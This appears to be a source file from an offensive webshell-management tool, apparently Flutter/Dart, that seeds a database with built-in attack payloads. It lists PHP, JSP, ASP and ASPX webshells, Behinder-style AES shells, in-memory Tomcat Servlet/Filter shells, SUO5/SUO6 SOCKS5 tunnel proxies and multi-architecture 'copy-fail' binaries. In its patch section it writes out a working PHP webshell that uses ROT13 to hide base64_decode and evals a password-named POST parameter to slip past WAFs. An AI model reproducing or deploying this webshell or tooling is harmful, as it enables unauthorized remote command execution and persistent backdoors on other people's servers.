import 'dart:convert';
import 'dart:developer' as developer;

import 'package:flutter/services.dart';

import '../database/database_helper.dart';
import '../models/payload.dart';

/// 内置默认数据种子化服务
/// 版本号递增时自动补充新增的默认条目
class SeedService {
  static const _kMetaKey = 'seed_version';
  static const _kCurrentVersion = 12;
  static const _binaryContentPrefix = '__MATRIX_BINARY_B64__:';

  // ── Payload 分类 ─────────────────────────────────────────────────────────
  // 命名规则：{语言}_{技术}_{传参方式}
  // 内置条目的 name 须与 asset 文件名一致；若曾用旧名入库，在 _patchPayloads 里做重命名迁移。
  //
  // PHP
  //   php_eval_post.php       — eval() + POST cmd
  //   php_passthru_req.php    — passthru() + REQUEST cmd
  //   php_b64rot13_post.php   — base64+rot13 双重编码绕过
  // JSP
  //   jsp_runtime_get.jsp     — UTF-8 + ProcessBuilder + 字节解码中文；Matrix 用 echo|base64 -d|bash
  //   jsp_classloader_b64.jsp — ClassLoader 动态加载字节码（冰蝎风格）
  // ASP
  //   asp_wscript_get.asp     — WScript.Shell + GET cmd

  static const _defaultPayloads = [
    // ── PHP ──────────────────────────────────────────────────────────────
    _PayloadDef(
      asset: 'assets/defaults/payloads/webshell/php_eval_post.php',
      name: 'php_eval_post.php',
      type: 'php',
      description: 'PHP eval() webshell，POST 参数 cmd，最基础的一句话木马',
      tags: 'php,eval,post,classic',
    ),
    _PayloadDef(
      asset: 'assets/defaults/payloads/webshell/php_passthru_req.php',
      name: 'php_passthru_req.php',
      type: 'php',
      description: 'PHP passthru() 命令执行，GET/POST 参数 cmd，回显直接输出',
      tags: 'php,passthru,request,cmd',
    ),
    _PayloadDef(
      asset: 'assets/defaults/payloads/webshell/php_b64rot13_post.php',
      name: 'php_b64rot13_post.php',
      type: 'php',
      description: 'ROT13 + Base64 双重编码绕过 WAF，POST 参数 mAtrix_911',
      tags: 'php,bypass,base64,rot13,waf',
    ),
    _PayloadDef(
      asset: 'assets/defaults/payloads/webshell/php_behinder.php',
      name: 'php_behinder.php',
      type: 'php',
      description: 'PHP 冰蝎 3.0（Behinder），AES 加密，func|params 格式，默认密码 mAtrix_911',
      tags: 'php,behinder,aes,encrypt,冰蝎',
      sinceVersion: 6,
    ),
    // ── JSP ──────────────────────────────────────────────────────────────
    _PayloadDef(
      asset: 'assets/defaults/payloads/webshell/jsp_runtime_get.jsp',
      name: 'jsp_runtime_get.jsp',
      type: 'jsp',
      description:
          'JSP bash -c + mAtrix_911；UTF-8 请求/响应、子进程输出 UTF-8/GB18030/GBK、合并 stderr；Matrix 用 base64 管道传脚本',
      tags: 'jsp,runtime,exec,post,utf8',
    ),
    _PayloadDef(
      asset: 'assets/defaults/payloads/webshell/jsp_classloader_b64.jsp',
      name: 'jsp_classloader_b64.jsp',
      type: 'jsp',
      description: 'JSP ClassLoader 动态加载字节码（冰蝎风格），GET 参数 cmd 传 Base64 类文件',
      tags: 'jsp,classloader,bytecode,base64,behinder',
    ),
    _PayloadDef(
      asset: 'assets/defaults/payloads/webshell/jsp_behinder.jsp',
      name: 'jsp_behinder.jsp',
      type: 'jsp',
      description:
          'JSP 冰蝎 3.0（Behinder），AES 加密，payload 只读 body 第一行，agent 读第二行取参',
      tags: 'jsp,behinder,aes,encrypt,冰蝎',
      sinceVersion: 5,
    ),
    _PayloadDef(
      asset: 'assets/defaults/payloads/webshell/jsp_behinder_mem_servlet.jsp',
      name: 'jsp_behinder_mem_servlet.jsp',
      type: 'jsp',
      description: 'JSP 内存马注入（Behinder 兼容），动态注册 Servlet 并通过 AES 通信',
      tags: 'jsp,behinder,memory-shell,servlet,aes,inject',
      sinceVersion: 9,
    ),
    _PayloadDef(
      asset: 'assets/defaults/payloads/webshell/jsp_behinder_mem_filter.jsp',
      name: 'jsp_behinder_mem_filter.jsp',
      type: 'jsp',
      description:
          'JSP 内存马（Behinder 兼容），动态注册 Filter；javax.servlet，适用 Tomcat 6/7/8/9',
      tags: 'jsp,behinder,memory-shell,filter,aes,tomcat9',
      sinceVersion: 12,
    ),
    _PayloadDef(
      asset:
          'assets/defaults/payloads/webshell/jsp_behinder_mem_filter_v10.jsp',
      name: 'jsp_behinder_mem_filter_v10.jsp',
      type: 'jsp',
      description:
          'JSP 内存马（Behinder 兼容），动态注册 Filter；jakarta.servlet，适用 Tomcat 10+',
      tags: 'jsp,behinder,memory-shell,filter,aes,tomcat10,jakarta',
      sinceVersion: 12,
    ),
    _PayloadDef(
      asset: 'assets/defaults/payloads/webshell/jsp_classloader_b64_debug.jsp',
      name: 'jsp_classloader_b64_debug.jsp',
      type: 'jsp',
      description:
          'JSP ClassLoader 加载字节码（调试版），显式错误与 HTTP 状态码；参数 mAtrix_911；生产请用 jsp_classloader_b64.jsp',
      tags: 'jsp,classloader,bytecode,base64,debug',
      sinceVersion: 12,
    ),
    // ── ASP ──────────────────────────────────────────────────────────────
    _PayloadDef(
      asset: 'assets/defaults/payloads/webshell/asp_wscript_get.asp',
      name: 'asp_wscript_get.asp',
      type: 'asp',
      description: 'ASP WScript.Shell 命令执行，GET 参数 cmd，cmd.exe /c',
      tags: 'asp,wscript,shell,get,cmd',
    ),
    // ── ASPX ─────────────────────────────────────────────────────────────
    _PayloadDef(
      asset: 'assets/defaults/payloads/webshell/aspx_cmd_post.aspx',
      name: 'aspx_cmd_post.aspx',
      type: 'aspx',
      description: 'ASPX .NET Process 命令执行，GET/POST 参数 cmd，纯文本输出，支持 PowerShell',
      tags: 'aspx,dotnet,process,cmd,powershell,windows',
      sinceVersion: 2,
    ),
    // ── SUO5 代理载荷 ──────────────────────────────────────────────────────
    _PayloadDef(
      asset: 'assets/defaults/payloads/suo5/suo5.php',
      name: 'suo5.php',
      type: 'php',
      description: 'SUO5 PHP 代理 payload，用于将 HTTP 隧道转发为 SOCKS5 连接',
      tags: 'suo5,php,proxy,tunnel,socks5',
      sinceVersion: 10,
    ),
    _PayloadDef(
      asset: 'assets/defaults/payloads/suo5/suo5.jsp',
      name: 'suo5.jsp',
      type: 'jsp',
      description: 'SUO5 JSP 代理 payload，用于在 Java 环境建立 HTTP-to-SOCKS5 隧道',
      tags: 'suo5,jsp,proxy,tunnel,socks5',
      sinceVersion: 10,
    ),
    _PayloadDef(
      asset: 'assets/defaults/payloads/suo5/suo5.aspx',
      name: 'suo5.aspx',
      type: 'aspx',
      description: 'SUO5 ASPX 代理 payload，用于在 .NET 环境建立 HTTP-to-SOCKS5 隧道',
      tags: 'suo5,aspx,proxy,tunnel,socks5,dotnet',
      sinceVersion: 10,
    ),
    // ── SUO6 代理载荷（JSP 单文件；PHP/ASPX 与流式模型不兼容，不提供默认资产）
    _PayloadDef(
      asset: 'assets/defaults/payloads/suo6/suo6.jsp',
      name: 'suo6.jsp',
      type: 'jsp',
      description: 'SUO6 JSP 代理 payload，单条 HTTP 连接多路复用 SOCKS5 流，XOR 加密',
      tags: 'suo6,jsp,proxy,tunnel,socks5,multiplex',
      sinceVersion: 11,
    ),
    // ── COPY-FAIL（二进制）─────────────────────────────────────────────────
    _PayloadDef(
      asset: 'assets/defaults/payloads/copy-fail/copyfail-go-linux-386',
      name: 'copyfail-go-linux-386',
      type: 'other',
      description: 'copy-fail Linux x86 (386) 二进制',
      tags: 'copy-fail,linux,386,binary',
      sinceVersion: 8,
      isBinary: true,
    ),
    _PayloadDef(
      asset: 'assets/defaults/payloads/copy-fail/copyfail-go-linux-amd64',
      name: 'copyfail-go-linux-amd64',
      type: 'other',
      description: 'copy-fail Linux x86_64 (amd64) 二进制',
      tags: 'copy-fail,linux,amd64,binary',
      sinceVersion: 8,
      isBinary: true,
    ),
    _PayloadDef(
      asset: 'assets/defaults/payloads/copy-fail/copyfail-go-linux-arm64',
      name: 'copyfail-go-linux-arm64',
      type: 'other',
      description: 'copy-fail Linux arm64 二进制',
      tags: 'copy-fail,linux,arm64,binary',
      sinceVersion: 8,
      isBinary: true,
    ),
    _PayloadDef(
      asset: 'assets/defaults/payloads/copy-fail/copyfail-go-linux-armv5',
      name: 'copyfail-go-linux-armv5',
      type: 'other',
      description: 'copy-fail Linux armv5 二进制',
      tags: 'copy-fail,linux,armv5,binary',
      sinceVersion: 8,
      isBinary: true,
    ),
    _PayloadDef(
      asset: 'assets/defaults/payloads/copy-fail/copyfail-go-linux-armv6',
      name: 'copyfail-go-linux-armv6',
      type: 'other',
      description: 'copy-fail Linux armv6 二进制',
      tags: 'copy-fail,linux,armv6,binary',
      sinceVersion: 8,
      isBinary: true,
    ),
    _PayloadDef(
      asset: 'assets/defaults/payloads/copy-fail/copyfail-go-linux-armv7',
      name: 'copyfail-go-linux-armv7',
      type: 'other',
      description: 'copy-fail Linux armv7 二进制',
      tags: 'copy-fail,linux,armv7,binary',
      sinceVersion: 8,
      isBinary: true,
    ),
    _PayloadDef(
      asset: 'assets/defaults/payloads/copy-fail/copyfail-go-linux-loong64',
      name: 'copyfail-go-linux-loong64',
      type: 'other',
      description: 'copy-fail Linux loong64 二进制',
      tags: 'copy-fail,linux,loong64,binary',
      sinceVersion: 8,
      isBinary: true,
    ),
    _PayloadDef(
      asset: 'assets/defaults/payloads/copy-fail/copyfail-go-linux-mips64',
      name: 'copyfail-go-linux-mips64',
      type: 'other',
      description: 'copy-fail Linux mips64 二进制',
      tags: 'copy-fail,linux,mips64,binary',
      sinceVersion: 8,
      isBinary: true,
    ),
    _PayloadDef(
      asset: 'assets/defaults/payloads/copy-fail/copyfail-go-linux-mips64le',
      name: 'copyfail-go-linux-mips64le',
      type: 'other',
      description: 'copy-fail Linux mips64le 二进制',
      tags: 'copy-fail,linux,mips64le,binary',
      sinceVersion: 8,
      isBinary: true,
    ),
    _PayloadDef(
      asset: 'assets/defaults/payloads/copy-fail/copyfail-go-linux-ppc64le',
      name: 'copyfail-go-linux-ppc64le',
      type: 'other',
      description: 'copy-fail Linux ppc64le 二进制',
      tags: 'copy-fail,linux,ppc64le,binary',
      sinceVersion: 8,
      isBinary: true,
    ),
    _PayloadDef(
      asset: 'assets/defaults/payloads/copy-fail/copyfail-go-linux-riscv64',
      name: 'copyfail-go-linux-riscv64',
      type: 'other',
      description: 'copy-fail Linux riscv64 二进制',
      tags: 'copy-fail,linux,riscv64,binary',
      sinceVersion: 8,
      isBinary: true,
    ),
  ];

  /// 需要更新内容的已有默认 payload（修复 bug 或改进实现）
  /// content 直接硬编码，不依赖 rootBundle 缓存，确保 patch 内容正确
  static const _patchPayloads = [
    // ── 名称统一（旧版使用简短名，新版与 asset 文件名对齐）──────────────────
    _PayloadPatch(names: ['php_simple.php'], newName: 'php_eval_post.php'),
    _PayloadPatch(names: ['php_cmd.php'], newName: 'php_passthru_req.php'),
    _PayloadPatch(names: ['jsp_simple.jsp'], newName: 'jsp_runtime_get.jsp'),
    _PayloadPatch(names: ['asp_simple.asp'], newName: 'asp_wscript_get.asp'),
    _PayloadPatch(
      names: ['jsp_behinder_mem.jsp'],
      newName: 'jsp_behinder_mem_servlet.jsp',
    ),
    // ── 内容修复 + 重命名 ────────────────────────────────────────────────
    // php_b64rot13：eval 不能作变量函数调用，改为 ROT13 混淆 base64_decode
    _PayloadPatch(
      names: ['php_bypass.php', 'php_b64rot13_post.php'],
      newName: 'php_b64rot13_post.php',
      content:
          '<?php\n'
          r"$f = str_rot13('onfr64_qrpbqr');"
          '\n'
          r"$q = $f($_POST['mAtrix_911']);"
          '\n'
          '@eval(\$q);\n'
          '?>\n',
    ),
  ];

  /// 应用启动时调用，幂等；storedVersion < currentVersion 时补充新版本的条目
  static Future<void> seed(DatabaseHelper db) async {
    // Patch 检查每次启动都运行（与版本号无关），内容不一致时直接覆盖
    await _applyPatches(db);

    final stored = await db.getMetaValue(_kMetaKey);
    final storedVersion = int.tryParse(stored ?? '0') ?? 0;
    if (storedVersion >= _kCurrentVersion) return;

    final existing = await db.getAllPayloads();
    final existingNames = existing.map((e) => e.name).toSet();

    for (final def in _defaultPayloads) {
      // 只种子化本次升级新增的条目
      if (def.sinceVersion <= storedVersion) continue;
      if (existingNames.contains(def.name)) continue;
      try {
        final content = await _loadPayloadContent(def);
        await db.createPayload(
          name: def.name,
          type: def.type,
          content: content,
          isDefault: true,
          description: def.description,
          tags: def.tags,
        );
        existingNames.add(def.name);
      } catch (e, st) {
        // asset 缺失时跳过，不中断启动；记录日志便于排查
        developer.log(
          'Seed payload failed: ${def.name} (${def.asset})',
          name: 'SeedService',
          error: e,
          stackTrace: st,
        );
      }
    }

    // 防卡死：即使某次执行出现异常，只要“当前应有条目”已经齐全，也推进版本号。
    final latest = await db.getAllPayloads();
    final latestNames = latest.map((e) => e.name).toSet();
    final pending = _defaultPayloads.where((def) {
      return def.sinceVersion <= _kCurrentVersion &&
          def.sinceVersion > storedVersion &&
          !latestNames.contains(def.name);
    }).toList();

    if (pending.isEmpty) {
      await db.setMetaValue(_kMetaKey, '$_kCurrentVersion');
    } else {
      final missing = pending.map((e) => e.name).join(', ');
      developer.log(
        'Seed version stays at $storedVersion, missing payloads: $missing',
        name: 'SeedService',
      );
    }
  }

  /// 每次启动检查内置 payload 名称/内容是否与预期一致，不一致则原地修复（幂等）
  static Future<void> _applyPatches(DatabaseHelper db) async {
    var existingPayloads = await db.getAllPayloads();

    // 0) 清理内置默认 payload 的重名重复项（历史数据兼容）
    final defaultNames = _defaultPayloads.map((e) => e.name).toSet();
    final grouped = <String, List<Payload>>{};
    for (final p in existingPayloads) {
      if (!p.isDefault) continue;
      if (!defaultNames.contains(p.name)) continue;
      grouped.putIfAbsent(p.name, () => []).add(p);
    }
    for (final entry in grouped.entries) {
      final items = entry.value;
      if (items.length <= 1) continue;
      items.sort((a, b) => b.updatedAt.compareTo(a.updatedAt));
      for (final dup in items.skip(1)) {
        try {
          await db.deletePayload(dup.id);
        } catch (_) {}
      }
    }
    existingPayloads = await db.getAllPayloads();

    // 1) 应用显式 Patch（重命名 / 内容修复）
    for (final patch in _patchPayloads) {
      for (final p in existingPayloads) {
        if (!patch.names.contains(p.name)) continue;
        final needsRename = patch.newName != null && p.name != patch.newName;
        final needsContent =
            patch.content != null && p.content.trim() != patch.content!.trim();
        if (!needsRename && !needsContent) continue; // 已是正确状态
        try {
          await db.updatePayload(
            p.copyWith(
              name: needsRename ? patch.newName : null,
              content: needsContent ? patch.content : null,
              updatedAt: DateTime.now(),
            ),
          );
        } catch (_) {}
      }
    }

    existingPayloads = await db.getAllPayloads();

    // 2) 统一修复所有内置默认 payload 的内容编码
    //   （早期版本用 String.fromCharCodes 读取 asset，中文注释会乱码）
    final expectedContentByName = <String, String>{};
    for (final def in _defaultPayloads) {
      try {
        expectedContentByName[def.name] = await _loadPayloadContent(def);
      } catch (_) {
        // 忽略缺失的 asset
      }
    }

    for (final p in existingPayloads) {
      final expected = expectedContentByName[p.name];
      if (expected == null) continue;
      if (!p.isDefault) continue;
      if (p.content.trim() == expected.trim()) continue;
      try {
        await db.updatePayload(
          p.copyWith(content: expected, updatedAt: DateTime.now()),
        );
      } catch (_) {}
    }

    // 3) 移除已从内置列表下架的默认 payload（数据库行 + 本地文件，见 PayloadDao.deletePayload）
    existingPayloads = await db.getAllPayloads();
    final allowedDefaultNames = _defaultPayloads.map((e) => e.name).toSet();
    for (final p in existingPayloads) {
      if (!p.isDefault) continue;
      if (allowedDefaultNames.contains(p.name)) continue;
      try {
        await db.deletePayload(p.id);
        developer.log(
          'Removed obsolete default payload: ${p.name}',
          name: 'SeedService',
        );
      } catch (e, st) {
        developer.log(
          'Failed to remove obsolete default payload: ${p.name}',
          name: 'SeedService',
          error: e,
          stackTrace: st,
        );
      }
    }
  }

  static Future<String> _loadPayloadContent(_PayloadDef def) async {
    if (!def.isBinary) return rootBundle.loadString(def.asset);
    final bytes = await rootBundle.load(def.asset);
    final data = bytes.buffer.asUint8List(
      bytes.offsetInBytes,
      bytes.lengthInBytes,
    );
    return _binaryContentPrefix + base64Encode(data);
  }
}

class _PayloadDef {
  final String asset;
  final String name;
  final String type;
  final String description;
  final String tags;

  /// 该条目从哪个 seed version 开始引入（用于增量种子化）
  final int sinceVersion;
  final bool isBinary;

  const _PayloadDef({
    required this.asset,
    required this.name,
    required this.type,
    required this.description,
    required this.tags,
    this.sinceVersion = 1,
    this.isBinary = false,
  });
}

class _PayloadPatch {
  /// 匹配的 payload 名称列表（兼容不同版本的命名）
  final List<String> names;

  /// 统一后的正确名称（为 null 时不重命名）
  final String? newName;

  /// 期望的正确内容（为 null 时不更新内容）
  final String? content;

  const _PayloadPatch({required this.names, this.newName, this.content});
}
